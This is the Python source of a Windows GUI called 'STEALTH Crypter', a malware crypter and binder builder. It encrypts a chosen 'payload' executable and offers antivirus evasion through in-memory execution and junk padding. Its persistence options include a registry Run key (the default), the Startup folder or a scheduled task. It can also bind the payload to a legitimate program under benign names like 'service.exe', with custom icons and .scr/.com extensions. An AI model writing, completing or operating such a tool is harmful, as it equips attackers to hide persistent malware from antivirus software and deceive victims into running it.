import sys
import os
import subprocess
import hashlib
import re
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QPushButton, QFileDialog, QComboBox, QCheckBox, QMessageBox,
    QTextEdit, QFrame
)
from PyQt6.QtCore import Qt, pyqtSignal, QThread, QUrl
from PyQt6.QtGui import QIcon
from PyQt6.QtMultimedia import QMediaPlayer, QAudioOutput
import time
from PIL import Image
import win32api
import win32con
import win32process
from datetime import datetime
import ctypes
from ctypes import wintypes

class EncryptionThread(QThread):
    log_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)
    success_signal = pyqtSignal(str)

    def __init__(self, payload_path, output_path, key_hex, junk_size_mb, persistence_flag, load_in_memory,
                 icon_path, bind_to_path, payload_file_name, binded_file_name):
        super().__init__()
        self.payload_path = payload_path
        self.output_path = output_path
        self.key_hex = key_hex
        self.junk_size_mb = junk_size_mb
        self.persistence_flag = persistence_flag
        self.load_in_memory = load_in_memory
        self.icon_path = icon_path
        self.bind_to_path = bind_to_path
        self.payload_file_name = payload_file_name
        self.binded_file_name = binded_file_name

    def is_valid_ico(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                header = f.read(4)
                return header == b'\x00\x00\x01\x00'
        except Exception as e:
            self.log_signal.emit(f"Warning: Failed to validate ICO file {file_path}: {str(e)}")
            return False

    def convert_to_ico(self, image_path):
        try:
            self.log_signal.emit(f"Converting image {image_path} to ICO...")
            img = Image.open(image_path).convert("RGBA")
            target_size = 256
            self.log_signal.emit(f"Resizing image to {target_size}x{target_size}...")
            img = img.resize((target_size, target_size), Image.Resampling.LANCZOS)
            temp_ico_path = os.path.splitext(self.output_path)[0] + "_temp.ico"
            self.log_signal.emit(f"Saving image as ICO to {temp_ico_path}...")
            img.save(temp_ico_path, format="ICO")
            if not os.path.exists(temp_ico_path):
                self.log_signal.emit(f"Error: Failed to create ICO file {temp_ico_path}")
                return None
            self.log_signal.emit(f"Successfully converted image to ICO: {temp_ico_path}")
            return temp_ico_path
        except Exception as e:
            self.log_signal.emit(f"Error: Failed to convert image to ICO: {str(e)}")
            return None

    def set_icon_win32(self, exe_path, icon_path):
        try:
            hIcon = win32api.LoadImage(0, icon_path, win32con.IMAGE_ICON, 0, 0, win32con.LR_LOADFROMFILE)
            hExe = win32api.BeginUpdateResource(exe_path, False)
            win32api.UpdateResource(hExe, win32con.RT_ICON, 1, hIcon)
            win32api.EndUpdateResource(hExe, False)
            self.log_signal.emit("Icon set successfully using win32api.")
            return True
        except Exception as e:
            self.log_signal.emit(f"Warning: Failed to set icon using win32api: {str(e)}")
            return False

    def set_icon(self, exe_path, icon_path):
        icon_to_use = icon_path
        if not self.is_valid_ico(icon_path):
            self.log_signal.emit("Icon file is not a valid ICO. Attempting to convert...")
            icon_to_use = self.convert_to_ico(icon_path)
            if not icon_to_use:
                self.log_signal.emit("Warning: Could not convert image to ICO. Icon will not be set.")
                return False, icon_path

        rcedit_cmd = [
            "rcedit-x64.exe",
            exe_path,
            "--set-icon",
            icon_to_use
        ]
        self.log_signal.emit(f"Running rcedit command: {' '.join(rcedit_cmd)}")
        result = subprocess.run(rcedit_cmd, capture_output=True, text=True, creationflags=win32process.CREATE_NO_WINDOW)
        if result.returncode != 0:
            self.log_signal.emit(f"Warning: rcedit-x64.exe failed to set icon:\n{result.stderr}")
            self.set_icon_win32(exe_path, icon_to_use)

        return True, icon_to_use

    def run(self):
        try:
            self.log_signal.emit("Encrypting payload...")
            cryptor_cmd = [
                "stealth_cryptor.exe",
                self.payload_path,
                self.output_path,
                self.key_hex,
                self.junk_size_mb,
                self.persistence_flag,
                self.load_in_memory
            ]
            self.log_signal.emit(f"Running cryptor command: {' '.join(cryptor_cmd)}")
            result = subprocess.run(cryptor_cmd, capture_output=True, text=True, creationflags=win32process.CREATE_NO_WINDOW)
            if result.returncode != 0:
                self.error_signal.emit(f"Cryptor failed:\n{result.stderr}")
                return

            self.log_signal.emit(f"Encrypted file created at {self.output_path}")

            icon_to_use = self.icon_path if self.icon_path else ""
            temp_icon_to_delete = None

            if icon_to_use:
                if not self.is_valid_ico(icon_to_use):
                    self.log_signal.emit("Icon file is not a valid ICO. Attempting to convert...")
                    converted_icon = self.convert_to_ico(icon_to_use)
                    if converted_icon:
                        icon_to_use = converted_icon
                        temp_icon_to_delete = icon_to_use
                    else:
                        self.error_signal.emit("Failed to convert selected icon file. Please select a valid ICO file.")
                        return
                self.log_signal.emit(f"Using user-selected icon: {icon_to_use}")
            else:
                self.log_signal.emit("No icon selected. Proceeding without an icon.")

            if self.bind_to_path:
                self.log_signal.emit("Binding encrypted file with selected file...")
                binder_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "binder.exe")
                if not os.path.isfile(binder_exe):
                    self.error_signal.emit(f"binder.exe not found at {binder_exe}. Please compile binder.c.")
                    return

                temp_output = self.output_path + ".tmp"
                binder_exe = binder_exe.replace("/", "\\")
                exe1_path = self.output_path.replace("/", "\\")
                exe2_path = self.bind_to_path.replace("/", "\\")
                temp_output = temp_output.replace("/", "\\")
                icon_to_use = icon_to_use.replace("/", "\\") if icon_to_use else ""
                binder_cmd = [
                    binder_exe,
                    exe1_path,
                    exe2_path,
                    temp_output,
                    self.payload_file_name,
                    self.binded_file_name,
                    icon_to_use
                ]
                self.log_signal.emit(f"Running binder command: {' '.join(binder_cmd)}")
                result = subprocess.run(binder_cmd, capture_output=True, text=True, creationflags=win32process.CREATE_NO_WINDOW)
                if result.returncode != 0:
                    self.error_signal.emit(f"Binding failed:\n{result.stderr}")
                    if os.path.exists(temp_output):
                        os.remove(temp_output)
                    if temp_icon_to_delete:
                        try:
                            os.remove(temp_icon_to_delete)
                            self.log_signal.emit(f"Cleaned up temporary icon file: {temp_icon_to_delete}")
                        except Exception as e:
                            self.log_signal.emit(f"Warning: Failed to remove temporary icon file {temp_icon_to_delete}: {str(e)}")
                    return

                os.remove(self.output_path)
                os.rename(temp_output, self.output_path)
                self.log_signal.emit("Binding completed successfully.")
                if temp_icon_to_delete:
                    try:
                        os.remove(temp_icon_to_delete)
                        self.log_signal.emit(f"Cleaned up temporary icon file: {temp_icon_to_delete}")
                    except Exception as e:
                        self.log_signal.emit(f"Warning: Failed to remove temporary icon file {temp_icon_to_delete}: {str(e)}")
            elif icon_to_use:
                self.log_signal.emit("Applying icon to encrypted stub for no-binding case...")
                success, icon_to_use = self.set_icon(self.output_path, self.icon_path)
                if not success:
                    self.error_signal.emit("Failed to apply icon to encrypted stub. Continuing without icon.")
                if icon_to_use != self.icon_path:
                    temp_icon_to_delete = icon_to_use
                    try:
                        os.remove(temp_icon_to_delete)
                        self.log_signal.emit(f"Cleaned up temporary icon file: {temp_icon_to_delete}")
                    except Exception as e:
                        self.log_signal.emit(f"Warning: Failed to remove temporary icon file {temp_icon_to_delete}: {str(e)}")
            else:
                self.log_signal.emit("Binding not selected, and no icon provided.")

            self.success_signal.emit(f"Encrypted stub generated: {self.output_path}")

        except Exception as e:
            self.error_signal.emit(f"Failed to generate stub: {str(e)}")

class StealthGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("STEALTH Crypter")
        self.setGeometry(100, 100, 1000, 600)

        self.setStyleSheet("""
            QMainWindow { background-color: #1C2526; }
            QLabel { color: #00FF00; font-family: 'Courier New'; font-size: 14px; }
            QLineEdit { background-color: #2E2E2E; color: #C1D7D0; border: 1px solid #00FF00; padding: 5px; font-family: 'Courier New'; font-size: 14px; }
            QComboBox { background-color: #2E2E2E; color: #C1D7D0; border: 1px solid #00FF00; padding: 5px; font-family: 'Courier New'; font-size: 14px; }
            QComboBox::drop-down { border: none; }
            QComboBox QAbstractItemView { background-color: #2E2E2E; color: #C1D7D0; selection-background-color: #00FF00; selection-color: #1C2526; }
            QCheckBox { color: #00FF00; font-family: 'Courier New'; font-size: 14px; }
            QCheckBox::indicator { border: 1px solid #00FF00; background-color: #2E2E2E; }
            QCheckBox::indicator:checked { background-color: #00FF00; }
            QMessageBox { background-color: #1C2526; color: #00FF00; font-family: 'Courier New'; font-size: 14px; }
            QMessageBox QPushButton { background-color: transparent; color: #00FF00; border: 1px solid #00FF00; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QMessageBox QPushButton:hover { background-color: #00FF00; color: #1C2526; }
            QTextEdit { background-color: #2E2E2E; color: #00FF00; border: 1px solid #00FF00; font-family: 'Courier New'; font-size: 12px; }
            QFrame#sectionFrame { border: 1px solid #00FF00; border-radius: 5px; background-color: #2E2E2E; }
            QLabel#sectionLabel { color: #00FF00; font-family: 'Courier New'; font-size: 16px; font-weight: bold; }
            QPushButton#clearButton { background-color: transparent; color: #FF5555; border: 1px solid #FF5555; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QPushButton#clearButton:hover { background-color: #FF5555; color: #1C2526; }
            QPushButton#clearButton:pressed { background-color: #FF5555; color: #1C2526; }
            QPushButton#regenButton { background-color: transparent; color: #00FF00; border: 1px solid #00FF00; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QPushButton#regenButton:hover { background-color: #00FF00; color: #1C2526; }
            QPushButton#regenButton:pressed { background-color: #00FF00; color: #1C2526; }
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # Section 1: Input File
        input_frame = QFrame()
        input_frame.setObjectName("sectionFrame")
        input_layout = QVBoxLayout(input_frame)
        input_label = QLabel("Input File")
        input_label.setObjectName("sectionLabel")
        input_layout.addWidget(input_label)

        payload_layout = QHBoxLayout()
        payload_label = QLabel("Select File (.exe):")
        self.payload_input = QLineEdit()
        self.payload_input.setReadOnly(True)
        payload_button = QPushButton("Browse")
        payload_button.clicked.connect(self.select_payload)
        payload_button.setStyleSheet("""
            QPushButton { background-color: transparent; color: #00FF00; border: 1px solid #00FF00; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QPushButton:hover { background-color: #00FF00; color: #1C2526; }
            QPushButton:pressed { background-color: #00FF00; color: #1C2526; }
        """)
        payload_clear_button = QPushButton("Clear")
        payload_clear_button.setObjectName("clearButton")
        payload_clear_button.clicked.connect(lambda: self.payload_input.setText(""))
        payload_layout.addWidget(payload_label)
        payload_layout.addWidget(self.payload_input)
        payload_layout.addWidget(payload_button)
        payload_layout.addWidget(payload_clear_button)
        input_layout.addLayout(payload_layout)
        main_layout.addWidget(input_frame)

        # Section 2: Output Settings
        output_frame = QFrame()
        output_frame.setObjectName("sectionFrame")
        output_layout = QVBoxLayout(output_frame)
        output_section_label = QLabel("Output Settings")
        output_section_label.setObjectName("sectionLabel")
        output_layout.addWidget(output_section_label)

        output_top_layout = QHBoxLayout()
        output_path_layout = QVBoxLayout()
        output_path_label = QLabel("Output Path:")
        self.output_path_input = QLineEdit()
        self.output_path_input.setReadOnly(True)
        output_path_button = QPushButton("Browse")
        output_path_button.clicked.connect(self.select_output_path)
        output_path_button.setStyleSheet("""
            QPushButton { background-color: transparent; color: #00FF00; border: 1px solid #00FF00; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QPushButton:hover { background-color: #00FF00; color: #1C2526; }
            QPushButton:pressed { background-color: #00FF00; color: #1C2526; }
        """)
        output_path_clear_button = QPushButton("Clear")
        output_path_clear_button.setObjectName("clearButton")
        output_path_clear_button.clicked.connect(lambda: self.output_path_input.setText(""))
        output_path_layout.addWidget(output_path_label)
        output_path_layout.addWidget(self.output_path_input)
        output_path_layout.addWidget(output_path_button)
        output_path_layout.addWidget(output_path_clear_button)
        output_top_layout.addLayout(output_path_layout)

        project_dir = os.getcwd()
        default_output_dir = os.path.join(project_dir, "output")
        if not os.path.exists(default_output_dir):
            os.makedirs(default_output_dir)
        self.output_path_input.setText(default_output_dir)

        output_right_layout = QVBoxLayout()
        output_filename_layout = QHBoxLayout()
        output_filename_label = QLabel("Filename:")
        self.output_filename_input = QLineEdit()
        self.output_filename_input.setText("encrypted")
        self.extension_combo = QComboBox()
        self.extension_combo.addItems([".exe", ".scr", ".com"])
        output_filename_layout.addWidget(output_filename_label)
        output_filename_layout.addWidget(self.output_filename_input)
        output_filename_layout.addWidget(self.extension_combo)
        output_right_layout.addLayout(output_filename_layout)

        self.unique_filename_check = QCheckBox("Append Timestamp")
        self.unique_filename_check.setChecked(True)
        output_right_layout.addWidget(self.unique_filename_check)
        output_top_layout.addLayout(output_right_layout)

        output_layout.addLayout(output_top_layout)

        icon_layout = QHBoxLayout()
        icon_label = QLabel("Select Icon (.ico):")
        self.icon_input = QLineEdit()
        self.icon_input.setReadOnly(True)
        icon_button = QPushButton("Browse")
        icon_button.clicked.connect(self.select_icon)
        icon_button.setStyleSheet("""
            QPushButton { background-color: transparent; color: #00FF00; border: 1px solid #00FF00; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QPushButton:hover { background-color: #00FF00; color: #1C2526; }
            QPushButton:pressed { background-color: #00FF00; color: #1C2526; }
        """)
        icon_clear_button = QPushButton("Clear")
        icon_clear_button.setObjectName("clearButton")
        icon_clear_button.clicked.connect(lambda: self.icon_input.setText(""))
        icon_layout.addWidget(icon_label)
        icon_layout.addWidget(self.icon_input)
        icon_layout.addWidget(icon_button)
        icon_layout.addWidget(icon_clear_button)
        output_layout.addLayout(icon_layout)
        main_layout.addWidget(output_frame)

        # Section 3 & 4: Encryption and Persistence Settings (Side-by-Side)
        enc_persist_layout = QHBoxLayout()

        # Encryption Settings
        encryption_frame = QFrame()
        encryption_frame.setObjectName("sectionFrame")
        encryption_layout = QVBoxLayout(encryption_frame)
        encryption_label = QLabel("Encryption Settings")
        encryption_label.setObjectName("sectionLabel")
        encryption_layout.addWidget(encryption_label)

        key_layout = QHBoxLayout()
        key_label = QLabel("Key (Random):")
        self.key_input = QLineEdit()
        self.key_input.setReadOnly(True)
        regen_button = QPushButton("Regen")
        regen_button.setObjectName("regenButton")
        regen_button.clicked.connect(self.generate_random_key)
        key_layout.addWidget(key_label)
        key_layout.addWidget(self.key_input)
        key_layout.addWidget(regen_button)
        encryption_layout.addLayout(key_layout)

        enc_persist_layout.addWidget(encryption_frame)

        # Persistence Settings
        persistence_frame = QFrame()
        persistence_frame.setObjectName("sectionFrame")
        persistence_layout = QVBoxLayout(persistence_frame)
        persistence_section_label = QLabel("Persistence Settings")
        persistence_section_label.setObjectName("sectionLabel")
        persistence_layout.addWidget(persistence_section_label)

        persistence_combo_layout = QHBoxLayout()
        persistence_label = QLabel("Method:")
        self.persistence_combo = QComboBox()
        self.persistence_combo.addItems([
            "None",
            "Startup Folder",
            "Registry Run Key (Preferred)",
            "Scheduled Task"
        ])
        self.persistence_combo.setCurrentText("Registry Run Key (Preferred)")
        persistence_combo_layout.addWidget(persistence_label)
        persistence_combo_layout.addWidget(self.persistence_combo)
        persistence_layout.addLayout(persistence_combo_layout)
        enc_persist_layout.addWidget(persistence_frame)

        main_layout.addLayout(enc_persist_layout)

        # Section 5: Detection Evasion
        detection_frame = QFrame()
        detection_frame.setObjectName("sectionFrame")
        detection_layout = QVBoxLayout(detection_frame)
        detection_label = QLabel("Detection Evasion")
        detection_label.setObjectName("sectionLabel")
        detection_layout.addWidget(detection_label)

        self.load_in_memory_check = QCheckBox("Execute in Memory")
        self.load_in_memory_check.setChecked(True)
        detection_layout.addWidget(self.load_in_memory_check)

        junk_layout = QHBoxLayout()
        junk_label = QLabel("Junk URLs Size (MB):")
        self.junk_combo = QComboBox()
        self.junk_combo.addItems(["0", "50", "100", "200", "300", "400", "500"])
        self.junk_combo.setCurrentText("100")
        junk_layout.addWidget(junk_label)
        junk_layout.addWidget(self.junk_combo)
        detection_layout.addLayout(junk_layout)

        main_layout.addWidget(detection_frame)

        # Section 6: Binding Settings
        binding_frame = QFrame()
        binding_frame.setObjectName("sectionFrame")
        binding_layout = QVBoxLayout(binding_frame)
        binder_label = QLabel("Binding Settings")
        binder_label.setObjectName("sectionLabel")
        binding_layout.addWidget(binder_label)

        bind_to_layout = QHBoxLayout()
        bind_to_label = QLabel("Bind To File (.exe):")
        self.bind_to_input = QLineEdit()
        self.bind_to_input.setReadOnly(True)
        bind_to_button = QPushButton("Browse")
        bind_to_button.clicked.connect(self.select_bind_to)
        bind_to_button.setStyleSheet("""
            QPushButton { background-color: transparent; color: #00FF00; border: 1px solid #00FF00; padding: 5px 10px; font-family: 'Courier New'; font-size: 14px; }
            QPushButton:hover { background-color: #00FF00; color: #1C2526; }
            QPushButton:pressed { background-color: #00FF00; color: #1C2526; }
        """)
        bind_to_clear_button = QPushButton("Clear")
        bind_to_clear_button.setObjectName("clearButton")
        bind_to_clear_button.clicked.connect(lambda: self.bind_to_input.setText(""))
        bind_to_layout.addWidget(bind_to_label)
        bind_to_layout.addWidget(self.bind_to_input)
        bind_to_layout.addWidget(bind_to_button)
        bind_to_layout.addWidget(bind_to_clear_button)
        binding_layout.addLayout(bind_to_layout)

        file_names_layout = QHBoxLayout()
        payload_file_name_label = QLabel("Payload Name:")
        self.payload_file_name_input = QLineEdit()
        self.payload_file_name_input.setText("service.exe")
        binded_file_name_label = QLabel("Binded Name:")
        self.binded_file_name_input = QLineEdit()
        self.binded_file_name_input.setText("binded.exe")
        file_names_layout.addWidget(payload_file_name_label)
        file_names_layout.addWidget(self.payload_file_name_input)
        file_names_layout.addWidget(binded_file_name_label)
        file_names_layout.addWidget(self.binded_file_name_input)
        binding_layout.addLayout(file_names_layout)
        main_layout.addWidget(binding_frame)

        # Section 7: Log Display
        log_frame = QFrame()
        log_frame.setObjectName("sectionFrame")
        log_layout = QVBoxLayout(log_frame)
        log_section_label = QLabel("Log Output")
        log_section_label.setObjectName("sectionLabel")
        log_layout.addWidget(log_section_label)

        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        self.log_display.setFixedHeight(100)
        log_layout.addWidget(self.log_display)
        main_layout.addWidget(log_frame)

        # Encrypt Button
        self.generate_button = QPushButton("Encrypt")
        self.generate_button.clicked.connect(self.start_encryption)
        self.generate_button.setStyleSheet("""
            QPushButton { background-color: transparent; color: #00FF00; border: 2px solid #00FF00; padding: 10px 20px; font-family: 'Courier New'; font-size: 16px; font-weight: bold; }
            QPushButton:hover { background-color: #00FF00; color: #1C2526; }
            QPushButton:pressed { background-color: #00FF00; color: #1C2526; }
            QPushButton:disabled { background-color: transparent; color: #008800; border: 2px solid #008800; }
        """)
        self.generate_button.setFixedSize(200, 50)
        main_layout.addWidget(self.generate_button, alignment=Qt.AlignmentFlag.AlignCenter)

        self.audio_output = QAudioOutput()
        self.media_player = QMediaPlayer()
        self.media_player.setAudioOutput(self.audio_output)
        self.media_player.setSource(QUrl.fromLocalFile("audio\\notification.wav"))
        self.last_sound_time = 0
        self.connect_count = 0
        self.sound_window = 1.0

        try:
            icon_path = os.path.join('icon', 'icon.ico')
            if os.path.exists(icon_path):
                self.setWindowIcon(QIcon(icon_path))
        except Exception as e:
            pass

        self.generate_random_key()

    def generate_random_key(self):
        advapi32 = ctypes.WinDLL('advapi32.dll')
        CryptGenRandom = advapi32.CryptGenRandom
        CryptGenRandom.argtypes = [ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(ctypes.c_ubyte)]
        CryptGenRandom.restype = wintypes.BOOL

        prov = ctypes.c_size_t()
        if not ctypes.windll.advapi32.CryptAcquireContextW(ctypes.byref(prov), None, None, 1, 0xF0000000):
            self.log_display.append(f"Error: Failed to acquire crypto context for key generation: {ctypes.get_last_error()}")
            return

        key_bytes = (ctypes.c_ubyte * 32)()
        if not CryptGenRandom(prov, 32, key_bytes):
            self.log_display.append(f"Error: Failed to generate random key: {ctypes.get_last_error()}")
            ctypes.windll.advapi32.CryptReleaseContext(prov, 0)
            return

        ctypes.windll.advapi32.CryptReleaseContext(prov, 0)
        key_hex = ''.join(format(b, '02x') for b in key_bytes)
        self.key_input.setText(key_hex)
        self.log_display.append(f"Generated random encryption key: {key_hex}")

    def play_connect_sound(self):
        current_time = time.time()
        if current_time - self.last_sound_time < self.sound_window:
            self.connect_count += 1
        else:
            self.connect_count = 1
            self.last_sound_time = current_time

        if self.connect_count == 1:
            self.media_player.play()
        elif self.connect_count < 100 and current_time - self.last_sound_time >= 1.0:
            self.media_player.play()
            self.last_sound_time = current_time
        elif self.connect_count == 100:
            self.media_player.play()
            self.last_sound_time = current_time

    def select_payload(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Select Payload File", "", "Executables (*.exe)")
        if file_name:
            self.payload_input.setText(file_name)

    def select_output_path(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Output Directory")
        if directory:
            self.output_path_input.setText(directory)

    def select_icon(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Select Icon File", "", "Icon Files (*.ico);;Image Files (*.png *.jpg *.jpeg *.bmp)")
        if file_name:
            self.icon_input.setText(file_name)

    def select_bind_to(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Select Bind To File", "", "Executables (*.exe)")
        if file_name:
            self.bind_to_input.setText(file_name)

    def start_encryption(self):
        self.play_connect_sound()
        payload_path = self.payload_input.text()
        if not payload_path:
            QMessageBox.critical(self, "Error", "Please select a payload file.")
            return

        if not os.path.exists(payload_path):
            QMessageBox.critical(self, "Error", "Payload file does not exist.")
            return

        output_dir = self.output_path_input.text()
        if not output_dir:
            QMessageBox.critical(self, "Error", "Please select an output directory.")
            return

        output_filename = self.output_filename_input.text()
        if not output_filename:
            QMessageBox.critical(self, "Error", "Please specify an output filename.")
            return

        output_filename_base = re.sub(r'[<>:"/\\|?*]', '', os.path.splitext(output_filename)[0])
        selected_extension = self.extension_combo.currentText()

        if self.unique_filename_check.isChecked():
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_filename = f"{output_filename_base}_{timestamp}{selected_extension}"
        else:
            output_filename = f"{output_filename_base}{selected_extension}"

        self.log_display.append(f"Output filename: {output_filename}")

        output_path = os.path.join(output_dir, output_filename)
        if len(output_path) > 260:
            QMessageBox.warning(self, "Warning", "Output path is too long and may cause issues.")
            return

        if os.path.exists(output_path):
            reply = QMessageBox.question(self, "File Exists", "Output file already exists. Overwrite?",
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.No:
                return

        if not os.path.exists("stealth_cryptor.exe"):
            QMessageBox.critical(self, "Error", "stealth_cryptor.exe not found in the project directory.")
            return

        if not os.path.exists("stub.exe"):
            QMessageBox.critical(self, "Error", "stub.exe not found. Please run stub_generator.exe to generate it.")
            return

        if not os.path.exists("rcedit-x64.exe"):
            pass
            QMessageBox.warning(self, "Warning", "rcedit-x64.exe not found. Icon setting may fail if binding is not used.")

        icon_path = self.icon_input.text()
        if icon_path and not os.path.exists(icon_path):
            QMessageBox.warning(self, "Warning", "Icon file does not exist. Icon will not be set.")
            icon_path = ""

        bind_to_path = self.bind_to_input.text()
        if bind_to_path and not os.path.exists(bind_to_path):
            QMessageBox.critical(self, "Error", "Bind to file does not exist.")
            return

        key = self.key_input.text()
        junk_size_mb = self.junk_combo.currentText()
        persistence_flag = str(self.persistence_combo.currentIndex()) # Direct index as number
        load_in_memory = "1" if self.load_in_memory_check.isChecked() else "0"
        payload_file_name = self.payload_file_name_input.text()
        binded_file_name = self.binded_file_name_input.text()

        if bind_to_path:
            if not payload_file_name:
                QMessageBox.critical(self, "Error", "Please specify a payload file name for binding.")
                return
            if not binded_file_name:
                QMessageBox.critical(self, "Error", "Please specify a binded file name for binding.")
                return
            if not payload_file_name.endswith(".exe"):
                payload_file_name += ".exe"
            if not binded_file_name.endswith(".exe"):
                binded_file_name += ".exe"

        key_bytes = hashlib.sha256(key.encode()).digest()
        key_hex = key_bytes.hex()

        self.encryption_thread = EncryptionThread(
            payload_path, output_path, key_hex, junk_size_mb, persistence_flag, load_in_memory,
            icon_path, bind_to_path, payload_file_name, binded_file_name
        )
        self.encryption_thread.log_signal.connect(self.append_log)
        self.encryption_thread.error_signal.connect(self.show_error)
        self.encryption_thread.success_signal.connect(self.show_success)
        self.encryption_thread.start()

        self.generate_button.setEnabled(False)
        self.generate_button.setText("Encrypting...")

    def append_log(self, message):
        self.log_display.append(message)

    def show_error(self, message):
        QMessageBox.critical(self, "Error", message)
        self.generate_button.setEnabled(True)
        self.generate_button.setText("Encrypt")

    def show_success(self, message):
        QMessageBox.information(self, "Success", message)
        self.generate_button.setEnabled(True)
        self.generate_button.setText("Encrypt")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = StealthGUI()
    window.show()
    sys.exit(app.exec())